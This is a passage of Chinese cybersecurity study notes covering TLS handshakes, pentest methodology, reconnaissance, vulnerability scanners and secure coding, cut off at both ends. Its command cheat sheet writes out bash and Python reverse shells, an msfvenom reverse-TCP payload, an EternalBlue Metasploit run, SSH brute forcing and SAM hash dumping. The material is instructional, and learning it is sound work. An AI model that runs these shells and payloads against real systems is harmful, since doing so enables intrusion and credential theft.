| 完整性   | 防止数据被篡改 |
| 身份认证 | 验证服务器身份 |

### 1.2 TLS 版本演进

| 版本    | 年份 | 状态     | 安全性      |
| ------- | ---- | -------- | ----------- |
| SSL 3.0 | 1996 | 废弃     | POODLE 攻击 |
| TLS 1.0 | 1999 | 废弃     | BEAST 攻击  |
| TLS 1.1 | 2006 | 废弃     | -           |
| TLS 1.2 | 2008 | 广泛使用 | 安全        |
| TLS 1.3 | 2018 | 推荐     | 最安全      |

## 2. TLS 1.2 握手过程

### 2.1 完整握手流程

```
Client                                          Server
  |                                                |
  |  1. ClientHello                                |
  |  (TLS版本, 密码套件, 随机数Rc, SNI)           |
  |----------------------------------------------->|
  |                                                |
  |  2. ServerHello                                |
  |  (TLS版本, 选定套件, 随机数Rs)                 |
  |  Certificate (服务器证书链)                     |
  |  ServerKeyExchange (DH参数)                    |
  |  ServerHelloDone                               |
  |<-----------------------------------------------|
  |                                                |
  |  3. ClientKeyExchange (DH公钥)                 |
  |  ChangeCipherSpec                              |
  |  Finished                                      |
  |----------------------------------------------->|
  |                                                |
  |  4. ChangeCipherSpec                           |
  |  Finished                                      |
  |<-----------------------------------------------|
  |                                                |
  |  ========== 加密通信开始 ==========            |
```

### 2.2 密钥推导

使用 ECDHE 密钥交换：

1. 双方交换 DH 公钥
2. 计算共享密钥 $K = g^{ab} \mod p$
3. 通过 PRF 推导主密钥：$master\_secret = PRF(K, "master secret", Rc || Rs)$
4. 从主密钥推导会话密钥：加密密钥、MAC 密钥、IV

### 2.3 密码套件

```mermaid
flowchart TD
    T0["TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"]
    T1["PRF/HMAC"]
    T2["加密模式"]
    T3["加密算法"]
    T4["签名算法"]
    T5["密钥交换"]
    T6["协议"]
    T5 --> T6
```

## 3. TLS 1.3 握手过程

### 3.1 1-RTT 握手

```
Client                                          Server
  |                                                |
  |  1. ClientHello                                |
  |  (TLS 1.3, 密码套件, DH公钥share, 随机数)     |
  |----------------------------------------------->|
  |                                                |
  |  2. ServerHello                                |
  |  (选定套件, DH公钥share)                       |
  |  EncryptedExtensions                           |
  |  Certificate                                   |
  |  CertificateVerify                             |
  |  Finished                                      |
  |<-----------------------------------------------|
  |                                                |
  |  3. Finished                                   |
  |----------------------------------------------->|
  |                                                |
  |  ========== 加密通信开始 ==========            |
```

### 3.2 TLS 1.3 改进

| 改进           | 描述                          |
| -------------- | ----------------------------- |
| 握手 1-RTT     | 合并密钥交换到 ClientHello    |
| 0-RTT 恢复     | 会话恢复零延迟                |
| 移除不安全算法 | 删除 RSA 密钥交换、CBC 模式等 |
| 强制前向保密   | 仅支持 ECDHE                  |
| 加密更多握手   | ServerHello 之后全部加密      |

### 3.3 0-RTT 恢复

```
Client                                          Server
  |                                                |
  |  ClientHello + Early Data                      |
  |  (PSK + DH share + 应用数据)                   |
  |----------------------------------------------->|
  |                                                |
  |  ServerHello + New Session Ticket              |
  |  Application Data                              |
  |<-----------------------------------------------|
```

**注意**：0-RTT 数据存在**重放攻击**风险，仅适用于幂等操作。

## 4. 证书验证

### 4.1 验证流程

```
1. 检查证书是否由受信 CA 签发（签名验证）
2. 检查证书域名是否匹配（SAN/CN）
3. 检查证书是否在有效期内
4. 检查证书是否被吊销（OCSP/CRL）
5. 检查证书链完整性
```

### 4.2 主机名验证

```python
import ssl
import socket

context = ssl.create_default_context()
with socket.create_connection(('example.com', 443)) as sock:
    with context.wrap_socket(sock, server_hostname='example.com') as ssock:
        cert = ssock.getpeercert()
        # 自动验证主机名
```

## 5. HTTPS 安全配置

### 5.1 Nginx 配置

```nginx
server {
    listen 443 ssl http2;
    server_name example.com;

    # 证书
    ssl_certificate /etc/ssl/certs/example.com.pem;
    ssl_certificate_key /etc/ssl/private/example.com.key;

    # TLS 版本
    ssl_protocols TLSv1.2 TLSv1.3;

    # 密码套件
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;

    # 优先服务器密码套件
    ssl_prefer_server_ciphers on;

    # HSTS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

    # OCSP Stapling
    ssl_stapling on;
    ssl_stapling_verify on;
}
```

### 5.2 安全头

| 头                        | 值                                    | 作用           |
| ------------------------- | ------------------------------------- | -------------- |
| Strict-Transport-Security | `max-age=31536000; includeSubDomains` | 强制 HTTPS     |
| X-Content-Type-Options    | `nosniff`                             | 防止 MIME 嗅探 |
| X-Frame-Options           | `DENY`                                | 防止点击劫持   |

## 6. TLS 常见攻击

| 攻击       | 目标            | 防御             |
| ---------- | --------------- | ---------------- |
| BEAST      | TLS 1.0 CBC     | 升级到 TLS 1.2+  |
| POODLE     | SSL 3.0         | 禁用 SSL 3.0     |
| Heartbleed | OpenSSL 实现    | 升级 OpenSSL     |
| Logjam     | DH 512 位       | 使用 2048+ 位 DH |
| ROBOT      | RSA PKCS#1 v1.5 | 使用 RSA-OAEP    |
| Downgrade  | 协议降级        | TLS 1.3 强制     |

## 7. 证书部署最佳实践

| 实践              | 描述                       |
| ----------------- | -------------------------- |
| 自动续期          | 使用 certbot/Let's Encrypt |
| 证书监控          | 监控过期时间               |
| CT 日志           | 确保证书被记录             |
| 完美前向保密      | 仅使用 ECDHE 密码套件      |
| HTTP→HTTPS 重定向 | 301 重定向                 |
| HSTS Preload      | 提交到浏览器预加载列表     |



<!-- ============ 文档分隔线：033-cybersecurity/022-PenetrationTestingMethodology.md ============ -->


## 1. 渗透测试标准

### 1.1 PTES 七阶段

| 阶段 | 名称     | 描述                 |
| ---- | -------- | -------------------- |
| 1    | 前期交互 | 确定范围、目标、规则 |
| 2    | 信息收集 | 被动/主动侦察        |
| 3    | 威胁建模 | 识别攻击路径         |
| 4    | 漏洞分析 | 发现和验证漏洞       |
| 5    | 渗透攻击 | 利用漏洞获取访问     |
| 6    | 后渗透   | 权限提升、横向移动   |
| 7    | 报告编写 | 整理发现与建议       |

### 1.2 OSSTMM

开放安全测试方法论（Open Source Security Testing Methodology Manual）：

- 科学化测试方法
- 可量化风险评估
- 五大通道：人力、物理、无线、电信、数据网络

### 1.3 OWASP 测试指南

| 阶段     | 测试项             |
| -------- | ------------------ |
| 信息收集 | 基础设施、技术栈   |
| 配置管理 | 服务器配置、日志   |
| 身份认证 | 密码策略、会话管理 |
| 授权     | 权限控制、越权     |
| 输入验证 | 注入、XSS          |
| 业务逻辑 | 流程绕过           |

## 2. 渗透测试流程

### 2.1 前期交互

**关键文档**：

| 文档     | 内容                   |
| -------- | ---------------------- |
| 授权书   | 书面授权，明确测试范围 |
| 规则约定 | 测试时间、禁止行为     |
| 范围定义 | IP 段、域名、应用      |
| 紧急联系 | 出现问题时联系谁       |

### 2.2 信息收集

**被动信息收集**：

| 技术       | 工具          | 获取信息        |
| ---------- | ------------- | --------------- |
| DNS 枚举   | dig, nslookup | 子域名、MX 记录 |
| WHOIS      | whois         | 注册信息        |
| 搜索引擎   | Google Dork   | 敏感文件、目录  |
| 证书透明度 | crt.sh        | 子域名          |
| 网络空间   | Shodan, FOFA  | 开放服务        |
| 社交媒体   | OSINT         | 员工信息        |

**主动信息收集**：

| 技术     | 工具                | 获取信息       |
| -------- | ------------------- | -------------- |
| 端口扫描 | Nmap                | 开放端口、服务 |
| 服务识别 | Nmap -sV            | 服务版本       |
| 操作系统 | Nmap -O             | OS 类型        |
| Web 指纹 | Wappalyzer          | 技术栈         |
| 目录扫描 | dirsearch, gobuster | 隐藏路径       |

### 2.3 漏洞分析

```
1. 自动化扫描 → 发现潜在漏洞
2. 手动验证 → 确认漏洞真实性
3. 漏洞分级 → 评估影响程度
4. 组合利用 → 构建攻击链
```

### 2.4 渗透攻击

**方法论**：

```
1. 选择漏洞 → 匹配目标环境
2. 准备 Exploit → 适配目标版本
3. 执行攻击 → 获取初始访问
4. 验证结果 → 确认权限级别
```

**常用工具**：

| 工具          | 用途         |
| ------------- | ------------ |
| Metasploit    | 综合渗透框架 |
| Burp Suite    | Web 渗透     |
| sqlmap        | SQL 注入     |
| Cobalt Strike | 高级后渗透   |

### 2.5 后渗透

| 活动     | 描述                      |
| -------- | ------------------------- |
| 权限提升 | 本地提权（Linux/Windows） |
| 横向移动 | 内网渗透                  |
| 数据收集 | 敏感数据定位              |
| 持久化   | 后门植入                  |
| 痕迹清理 | 日志清除                  |

## 3. 渗透测试类型

### 3.1 按知识分类

| 类型 | 测试者信息 | 模拟场景   |
| ---- | ---------- | ---------- |
| 黑盒 | 无任何信息 | 外部攻击者 |
| 白盒 | 完全信息   | 内部人员   |
| 灰盒 | 部分信息   | 内部威胁   |

### 3.2 按位置分类

| 类型     | 描述         |
| -------- | ------------ |
| 外部测试 | 从互联网发起 |
| 内部测试 | 从内网发起   |
| 物理测试 | 物理安全评估 |

## 4. 报告编写

### 4.1 报告结构

```
1. 执行摘要（管理层）
2. 测试范围与方法
3. 发现摘要（风险矩阵）
4. 详细发现
   - 漏洞描述
   - 复现步骤
   - 证据截图
   - 风险评级
   - 修复建议
5. 附录
```

### 4.2 风险评级

**CVSS 评分**：

| 评级 | CVSS 分数 | 描述       |
| ---- | --------- | ---------- |
| 严重 | 9.0-10.0  | 立即修复   |
| 高危 | 7.0-8.9   | 尽快修复   |
| 中危 | 4.0-6.9   | 计划修复   |
| 低危 | 0.1-3.9   | 可接受风险 |
| 信息 | 0         | 仅供参考   |

### 4.3 修复优先级

```
1. 互联网暴露的严重/高危漏洞 → 立即
2. 内网高危漏洞 → 48 小时内
3. 中危漏洞 → 1 周内
4. 低危漏洞 → 下次迭代
```

## 5. 法律与道德

### 5.1 法律要求

- 必须获得书面授权
- 遵守测试范围
- 不得超出授权行为
- 保护获取的数据

### 5.2 职业道德

- 保密客户信息
- 如实报告发现
- 不隐瞒漏洞
- 不植入后门
- 及时报告紧急漏洞
## 信息收集

**基本写法:DNS 枚举**
`dig any <域名>`
```bash
# 查询域名所有 DNS 记录
dig any example.com
```

**基本写法:子域名枚举**
`subfinder -d <域名>`
```bash
# 使用 subfinder 枚举子域名
subfinder -d example.com -o subdomains.txt
```

**基本写法:DNS 区域传送测试**
`dig axfr @<DNS服务器> <域名>`
```bash
# 测试 DNS 区域传送是否允许
dig axfr @ns1.example.com example.com
```

**基本写法:Whois 查询**
`whois <域名>`
```bash
# 查询域名注册信息
whois example.com
```

**基本写法:搜索引擎语法**
`site:<域名> intitle:"index of"`
```bash
# 使用 Google Hacking 查找敏感信息
site:example.com intitle:"index of" -inurl:(html|php)
```

---

## 端口扫描

**基本写法:nmap 基础扫描**
`nmap -sV <目标>`
```bash
# 扫描目标开放端口与服务版本
nmap -sV 192.168.1.10
```

**基本写法:快速端口扫描**
`nmap -T4 -F <目标>`
```bash
# 快速扫描常用端口
nmap -T4 -F 192.168.1.10
```

**基本写法:全端口扫描**
`nmap -p- -T4 <目标>`
```bash
# 扫描所有 65535 个端口
nmap -p- -T4 192.168.1.10
```

**基本写法:UDP 端口扫描**
`nmap -sU --top-ports <数量> <目标>`
```bash
# 扫描常用 UDP 端口
sudo nmap -sU --top-ports 100 192.168.1.10
```

**基本写法:操作系统识别**
`nmap -O <目标>`
```bash
# 识别目标操作系统
sudo nmap -O 192.168.1.10
```

**基本写法:漏洞脚本扫描**
`nmap --script vuln <目标>`
```bash
# 使用 nmap 漏洞脚本扫描
nmap --script vuln 192.168.1.10
```

---

## 服务枚举

**基本写法:SMB 枚举**
`enum4linux <目标>`
```bash
# 枚举 SMB 共享与用户信息
enum4linux -a 192.168.1.10
```

**基本写法:NFS 枚举**
`showmount -e <目标>`
```bash
# 查看 NFS 导出的目录
showmount -e 192.168.1.10
```

**基本写法:SSH 枚举**
`nmap --script ssh-* -p 22 <目标>`
```bash
# 使用 nmap SSH 脚本枚举
nmap --script ssh-* -p 22 192.168.1.10
```

**基本写法:SNMP 枚举**
`snmpwalk -c public -v1 <目标>`
```bash
# 枚举 SNMP 信息
snmpwalk -c public -v1 192.168.1.10
```

**基本写法:LDAP 枚举**
`ldapsearch -x -H ldap://<目标> -b <基准DN>`
```bash
# 枚举 LDAP 目录信息
ldapsearch -x -H ldap://192.168.1.10 -b "dc=example,dc=com"
```

---

## Web 应用测试

**基本写法:目录爆破**
`gobuster dir -u <URL> -w <字典>`
```bash
# 使用 gobuster 爆破 Web 目录
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt
```

**基本写法:子域名爆破**
`gobuster dns -d <域名> -w <字典>`
```bash
# 爆破子域名
gobuster dns -d example.com -w subdomains.txt
```

**基本写法:Nikto 漏洞扫描**
`nikto -h <URL>`
```bash
# 使用 Nikto 扫描 Web 漏洞
nikto -h https://example.com
```

**基本写法:SQL 注入测试**
`sqlmap -u <URL> --dbs`
```bash
# 使用 sqlmap 测试 SQL 注入
sqlmap -u "https://example.com/page?id=1" --dbs
```

**基本写法:XSS 检测**
`dalfox url <URL>`
```bash
# 使用 dalfox 检测 XSS 漏洞
dalfox url "https://example.com/search?q=test"
```

**基本写法:WordPress 扫描**
`wpscan --url <URL>`
```bash
# 扫描 WordPress 站点
wpscan --url https://example.com --enumerate u
```

---

## 漏洞利用

**基本写法:搜索漏洞**
`searchsploit <关键字>`
```bash
# 在 exploitdb 中搜索漏洞利用
searchsploit apache 2.4
```

**基本写法:查看漏洞详情**
`searchsploit -x <漏洞ID>`
```bash
# 查看漏洞利用代码详情
searchsploit -x 12345
```

**基本写法:复制漏洞利用代码**
`searchsploit -m <漏洞ID>`
```bash
# 复制漏洞利用代码到当前目录
searchsploit -m 12345
```

**基本写法:使用 Metasploit**
`msfconsole -q -x "use <模块>; set RHOSTS <目标>; run"`
```bash
# 使用 Metasploit 利用漏洞
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; run"
```

**基本写法:生成 Payload**
`msfvenom -p <payload> LHOST=<IP> LPORT=<端口> -f <格式> -o <文件>`
```bash
# 生成反向连接 Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
```

---

## 密码破解

**基本写法:使用 hashcat 破解**
`hashcat -m <类型> <哈希> <字典>`
```bash
# 使用 hashcat 破解 MD5 哈希(类型 0)
hashcat -m 0 hash.txt rockyou.txt
```

**基本写法:使用 john 破解**
`john --wordlist=<字典> <哈希文件>`
```bash
# 使用 John the Ripper 破解密码
john --wordlist=rockyou.txt hashes.txt
```

**基本写法:破解 zip 密码**
`john --wordlist=<字典> <zip2john输出>`
```bash
# 破解 ZIP 文件密码
zip2john protected.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
```

**基本写法:在线哈希查询**
`curl "https://hashtoolkit.com/reverse-hash?hash=<哈希>"`
```bash
# 在线查询哈希明文
curl "https://hashtoolkit.com/reverse-hash?hash=098f6bcd4621d373cade4e832627b4f6"
```

**基本写法:SSH 密码爆破**
`hydra -l <用户> -P <字典> ssh://<目标>`
```bash
# 使用 hydra 爆破 SSH
hydra -l root -P passwords.txt ssh://192.168.1.10
```

---

## 后渗透操作

**基本写法:建立反弹 shell**
`bash -i >& /dev/tcp/<攻击IP>/<端口> 0>&1`
```bash
# 通过 bash 反弹 shell 到攻击机
bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
```

**基本写法:Python 反弹 shell**
`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<端口>));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh"])'`
```bash
# Python 反弹 shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.5",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh"])'
```

**基本写法:升级交互式 shell**
`python3 -c 'import pty;pty.spawn("/bin/bash")'`
```bash
# 升级为交互式 shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**基本写法:端口转发**
`ssh -L <本地端口>:<目标>:<目标端口> <用户>@<跳板>`
```bash
# SSH 本地端口转发
ssh -L 8080:192.168.2.10:80 user@192.168.1.10
```

**基本写法:动态端口转发**
`ssh -D <本地端口> <用户>@<跳板>`
```bash
# SSH 动态端口转发建立 SOCKS 代理
ssh -D 1080 user@192.168.1.10
```

---

## 权限提升

**基本写法:查找 SUID 文件**
`find / -perm -4000 -type f 2>/dev/null`
```bash
# 查找 SUID 权限文件用于提权
find / -perm -4000 -type f 2>/dev/null
```

**基本写法:查看 sudo 权限**
`sudo -l`
```bash
# 查看当前用户 sudo 权限
sudo -l
```

**基本写法:使用 LinPEAS 枚举**
`./linpeas.sh`
```bash
# 运行 LinPEAS 自动枚举提权路径
./linpeas.sh | grep -i "suid\|sudo\|writable"
```

**基本写法:查看内核版本**
`uname -r`
```bash
# 查看内核版本查找内核漏洞
uname -r
```

**基本写法:查看计划任务**
`cat /etc/crontab`
```bash
# 查看系统计划任务寻找提权点
cat /etc/crontab
```

---

## 内网渗透

**基本写法:内网存活主机探测**
`nmap -sn <网段>`
```bash
# Ping 扫描探测存活主机
nmap -sn 192.168.1.0/24
```

**基本写法:使用 Proxychains**
`proxychains <命令>`
```bash
# 通过 SOCKS 代理执行命令
proxychains nmap -sT -Pn 192.168.2.0/24
```

**基本写法:搭建 SOCKS 代理**
`ssh -D <端口> <用户>@<跳板> -fN`
```bash
# 使用 SSH 建立后台 SOCKS 代理
ssh -D 1080 user@192.168.1.10 -fN
```

**基本写法:内网端口扫描**
`nmap -sT -Pn -n --top-ports 100 <网段>`
```bash
# 通过代理扫描内网常用端口
proxychains nmap -sT -Pn -n --top-ports 100 192.168.2.0/24
```

**基本写法:Windows 凭据收集**
`secretsdump.py -local <文件>`
```bash
# 使用 impacket 导出 SAM 哈希
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

---

## 报告生成

**基本写法:生成扫描报告**
`nmap -sV <目标> -oX <输出文件>`
```bash
# 输出 XML 格式扫描报告
nmap -sV 192.168.1.10 -oX scan_report.xml
```

**基本写法:转换为 HTML 报告**
`xsltproc <XML文件> -o <HTML文件>`
```bash
# 将 nmap XML 报告转为 HTML
xsltproc scan_report.xml -o report.html
```

**基本写法:整合多种扫描结果**
`python3 -c "import xml.etree.ElementTree as ET; ..."`
```bash
# 解析多个工具的扫描结果整合报告
python3 -c "
import xml.etree.ElementTree as ET
tree = ET.parse('scan_report.xml')
for host in tree.findall('host'):
    print(host.find('address').get('addr'))
"
```

**基本写法:生成渗透测试报告**
`pandoc <输入> -o <输出>`
```bash
# 使用 pandoc 生成 PDF 报告
pandoc report.md -o pentest_report.pdf --pdf-engine=xelatex
```

**基本写法:导出漏洞清单**
`grep -E "CVE|OSVDB" <报告> > <漏洞清单>`
```bash
# 提取所有漏洞编号
grep -E "CVE-[0-9]+-[0-9]+|OSVDB" scan_report.txt > vulnerabilities.txt
```



<!-- ============ 文档分隔线：033-cybersecurity/023-InformationGathering.md ============ -->



## 1. 信息收集概述

### 1.1 分类

| 类型     | 描述             | 特点             |
| -------- | ---------------- | ---------------- |
| 被动收集 | 不与目标直接交互 | 隐蔽、信息有限   |
| 主动收集 | 与目标直接交互   | 详细、可能被发现 |

### 1.2 收集目标

- 基础设施信息（IP、域名、网络拓扑）
- 技术栈信息（框架、中间件、CMS）
- 人员信息（员工、邮箱、组织架构）
- 业务信息（业务流程、合作伙伴）

## 2. 被动信息收集

### 2.1 DNS 信息

```bash
# 查询 A 记录
dig example.com A

# 查询所有记录
dig example.com ANY

# 区域传送（若配置不当）
dig axfr example.com @ns1.example.com

# 反向 DNS
dig -x 1.2.3.4
```

### 2.2 子域名枚举

| 工具      | 方法          | 特点       |
| --------- | ------------- | ---------- |
| subfinder | 被动 API 聚合 | 快速、全面 |
| Amass     | 被动+主动     | 最全面     |
| dnsrecon  | 字典+暴力     | 主动发现   |
| crt.sh    | 证书透明度    | 免费、有效 |

```bash
# subfinder
subfinder -d example.com -o subs.txt

# 证书透明度查询
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value'

# DNS 暴力破解
dnsrecon -d example.com -D wordlist.txt -t brt
```

### 2.3 搜索引擎技巧

```
# Google Dork
site:example.com
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com intitle:"index of"
"example.com" filetype:sql
"example.com" filetype:conf
```

### 2.4 网络空间搜索

| 平台    | 特点          |
| ------- | ------------- |
| Shodan  | IoT、工业设备 |
| FOFA    | 国内资产      |
| Censys  | 证书、服务    |
| ZoomEye | 国内资产      |

### 2.5 WHOIS 与历史记录

```bash
# WHOIS 查询
whois example.com

# 历史记录
# whois-history.com
# viewdns.info
```

## 3. 主动信息收集

### 3.1 端口扫描

```bash
# 常用扫描
nmap -sV -sC -O -p- target

# SYN 扫描（隐蔽）
nmap -sS target

# UDP 扫描
nmap -sU --top-ports 100 target

# 脚本扫描
nmap --script=vuln target
```

**Nmap 扫描类型**：

| 参数 | 类型       | 特点           |
| ---- | ---------- | -------------- |
| -sS  | SYN 扫描   | 半开连接、快速 |
| -sT  | TCP 全连接 | 完整握手       |
| -sU  | UDP 扫描   | 较慢           |
| -sV  | 版本探测   | 识别服务版本   |
| -O   | OS 探测    | 识别操作系统   |

### 3.2 Web 指纹识别

| 工具       | 识别内容          |
| ---------- | ----------------- |
| Wappalyzer | CMS、框架、服务器 |
| WhatWeb    | Web 技术栈        |
| Wapplyzer  | 批量识别          |
| BuiltWith  | 技术栈分析        |

```bash
# WhatWeb
whatweb example.com

# Wappalyzer CLI
wappalyzer https://example.com
```

### 3.3 目录扫描

```bash
# dirsearch
dirsearch -u https://example.com -e php,html,js

# gobuster
gobuster dir -u https://example.com -w wordlist.txt

# feroxbuster
feroxbuster -u https://example.com -w wordlist.txt
```

### 3.4 漏洞扫描

```bash
# Nmap 漏洞脚本
nmap --script=vuln target

# Nikto（Web 漏洞扫描）
nikto -h https://example.com

# Nuclei（模板化扫描）
nuclei -u https://example.com -t cves/
```

## 4. OSINT 框架

### 4.1 常用框架

| 框架         | 特点           |
| ------------ | -------------- |
| Maltego      | 图形化关联分析 |
| SpiderFoot   | 自动化 OSINT   |
| Recon-ng     | 模块化侦察     |
| theHarvester | 邮箱/域名收集  |

### 4.2 社交媒体情报

| 平台     | 信息类型           |
| -------- | ------------------ |
| LinkedIn | 员工、职位、技术栈 |
| GitHub   | 代码泄露、仓库     |
| Twitter  | 技术讨论、泄露     |
| Pastebin | 数据泄露           |

### 4.3 代码仓库泄露

```bash
# 搜索 GitHub 泄露
# 关键词：password、secret、api_key、token、private_key

# truffleHog
trufflehog https://github.com/target/repo

# gitLeaks
gitleaks detect --repo-url=https://github.com/target/repo
```

## 5. 信息整理与分析

### 5.1 攻击面映射

```
域名 → IP → 端口 → 服务 → 版本 → 漏洞
  ↓
子域名 → 邮箱 → 员工 → 社工
```

### 5.2 工具链

```
subfinder → httpx → nuclei → 报告
  ↓          ↓        ↓
子域名   存活检测   漏洞扫描
```



<!-- ============ 文档分隔线：033-cybersecurity/024-VulnerabilityScan.md ============ -->



## 1. 漏洞扫描概述

### 1.1 扫描类型

| 类型     | 描述             | 工具            |
| -------- | ---------------- | --------------- |
| 网络扫描 | 主机、端口、服务 | Nmap, Masscan   |
| 漏洞扫描 | 已知漏洞检测     | Nessus, OpenVAS |
| Web 扫描 | Web 应用漏洞     | Nikto, Nuclei   |
| 代码扫描 | 源代码漏洞       | SonarQube, SAST |

### 1.2 扫描策略

| 策略     | 描述              | 速度 | 准确度 |
| -------- | ----------------- | ---- | ------ |
| 快速扫描 | 常用端口+高危插件 | 快   | 中     |
| 标准扫描 | 全端口+标准插件   | 中   | 高     |
| 深度扫描 | 全端口+全部插件   | 慢   | 最高   |

## 2. Nessus

### 2.1 概述

Nessus 是最流行的商业漏洞扫描器，由 Tenable 开发。

| 版本                | 特点             |
| ------------------- | ---------------- |
| Nessus Essentials   | 免费、16 IP 限制 |
| Nessus Professional | 商业、无限制     |
| Nessus Manager      | 企业管理         |

### 2.2 扫描策略

| 策略                  | 用途         |
| --------------------- | ------------ |
| Basic Network Scan    | 通用网络扫描 |
| Advanced Scan         | 自定义扫描   |
| Web Application Tests | Web 应用     |
| Malware Scan          | 恶意软件     |
| Compliance Audit      | 合规审计     |

### 2.3 扫描流程

```
1. 创建扫描策略
2. 配置目标（IP/域名）
3. 设置凭据（可选，提高准确度）
4. 执行扫描
5. 分析结果
6. 导出报告
```

## 3. OpenVAS

### 3.1 概述

OpenVAS 是开源漏洞扫描器，是 Nessus 的分支。

### 3.2 安装与使用

```bash
# 安装（Kali Linux）
sudo apt install openvas
sudo gvm-setup

# 启动
sudo gvm-start

# 命令行扫描
gvm-cli socket --xml '<create_target><name>Test</name><hosts>192.168.1.0/24</hosts></create_target>'
```

### 3.3 与 Nessus 对比

| 对比项   | Nessus   | OpenVAS |
| -------- | -------- | ------- |
| 授权     | 商业     | 开源    |
| 插件更新 | 实时     | 延迟    |
| 界面     | 友好     | 一般    |
| 准确度   | 高       | 中      |
| 社区     | 商业支持 | 社区    |

## 4. Nuclei

### 4.1 概述

Nuclei 是基于模板的快速漏洞扫描器，由 ProjectDiscovery 开发。

### 4.2 核心特性

- YAML 模板驱动
- 并发扫描
- 社区模板库（5000+）
- 多协议支持

### 4.3 使用示例

```bash
# 基础扫描
nuclei -u https://example.com

# 使用特定模板
nuclei -u https://example.com -t cves/2023/

# 批量扫描
nuclei -l urls.txt -o results.txt

# 自定义模板
nuclei -u https://example.com -t custom-template.yaml
```

### 4.4 自定义模板

```yaml
id: custom-xss-check

info:
  name: Custom XSS Check
  author: security-team
  severity: medium

http:
  - method: GET
    path:
      - '{{BaseURL}}/search?q=<script>alert(1)</script>'
    matchers:
      - type: word
        words:
          - '<script>alert(1)</script>'
```

## 5. Nikto

### 5.1 概述

Nikto 是开源 Web 服务器扫描器，检测危险文件、过时组件、配置问题。

### 5.2 使用示例

```bash
# 基础扫描
nikto -h https://example.com

# 指定端口
nikto -h example.com -p 8080

# 使用代理
nikto -h example.com -useproxy http://proxy:8080

# 输出报告
nikto -h example.com -o report.html -Format htm
```

### 5.3 检测内容

| 类别       | 示例                   |
| ---------- | ---------------------- |
| 危险文件   | .git、.env、backup.sql |
| 过时组件   | 旧版 PHP、Apache       |
| 配置问题   | 目录列表、默认页面     |
| 服务器信息 | Server 头、版本        |

## 6. 扫描结果分析

### 6.1 误报处理

```
1. 确认漏洞是否真实存在
2. 手动验证扫描结果
3. 检查目标环境是否匹配
4. 排除已知误报模式
```

### 6.2 报告优先级

| 优先级 | 条件               |
| ------ | ------------------ |
| P0     | RCE、未授权访问    |
| P1     | SQL 注入、认证绕过 |
| P2     | XSS、CSRF          |
| P3     | 信息泄露、配置问题 |
| P4     | 低危、信息级       |

### 6.3 持续扫描

```
CI/CD 集成 → 每次部署自动扫描
定期扫描 → 每周/每月全量扫描
合规扫描 → 每季度合规审计
```



<!-- ============ 文档分隔线：033-cybersecurity/025-SecureCodingPrinciples.md ============ -->



## 1. 安全编码基础

### 1.1 核心原则

| 原则       | 描述                         |
| ---------- | ---------------------------- |
| 最小权限   | 仅授予完成任务所需的最小权限 |
| 纵深防御   | 多层安全措施                 |
| 失败安全   | 失败时进入安全状态           |
| 默认拒绝   | 默认拒绝访问，显式允许       |
| 不信任输入 | 所有外部输入都不可信         |
| 关注点分离 | 功能与安全逻辑分离           |

### 1.2 安全开发生命周期（SDL）

| 阶段 | 安全活动           |
| ---- | ------------------ |
| 需求 | 安全需求、合规要求 |
| 设计 | 威胁建模、安全架构 |
| 开发 | 安全编码、代码审查 |
| 测试 | 安全测试、渗透测试 |
| 部署 | 安全配置、漏洞扫描 |
| 运维 | 监控、应急响应     |

## 2. OWASP Top 10

### 2.1 2021 版

| 编号 | 风险           | 防御                         |
| ---- | -------------- | ---------------------------- |
| A01  | 权限控制失效   | 最小权限、RBAC、访问控制检查 |
| A02  | 加密失败       | TLS、强加密、密钥管理        |
| A03  | 注入           | 参数化查询、输入验证         |
| A04  | 不安全设计     | 威胁建模、安全模式           |
| A05  | 安全配置错误   | 自动化配置、最小化           |
| A06  | 过时组件       | 依赖更新、SCA                |
| A07  | 认证失败       | MFA、强密码策略              |
| A08  | 数据完整性失败 | 签名验证、安全反序列化       |
| A09  | 日志监控不足   | 集中日志、告警               |
| A10  | SSRF           | URL 白名单、内网隔离         |

## 3. 输入处理

### 3.1 输入验证

```python
# 白名单验证
def validate_username(username):
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username")
    return username

# 范围验证
def validate_age(age):
    age = int(age)
    if not (0 < age < 150):
        raise ValueError("Invalid age")
    return age
```

### 3.2 输出编码

| 上下文     | 编码方式               |
| ---------- | ---------------------- |
| HTML       | `&lt;` `&gt;` `&amp;`  |
| JavaScript | Unicode 转义           |
| URL        | `encodeURIComponent()` |
| SQL        | 参数化查询             |
| OS 命令    | 避免拼接               |

### 3.3 文件操作

```python
# 路径遍历防御
import os

def safe_path(base_dir, filename):
    # 规范化路径
    filepath = os.path.normpath(os.path.join(base_dir, filename))
    # 确保在基目录内
    if not filepath.startswith(os.path.abspath(base_dir)):
        raise ValueError("Path traversal detected")
    return filepath
```

## 4. 认证与授权

### 4.1 密码存储

```python
import bcrypt

# 存储
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(12))

# 验证
bcrypt.checkpw(password.encode(), hashed)
```

### 4.2 会话管理

```python
# 安全 Session 配置
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,   # 防 XSS
    SESSION_COOKIE_SECURE=True,     # 仅 HTTPS
    SESSION_COOKIE_SAMESITE='Lax',  # 防 CSRF
    PERMANENT_SESSION_LIFETIME=3600, # 1 小时过期
)
```

### 4.3 访问控制

```python
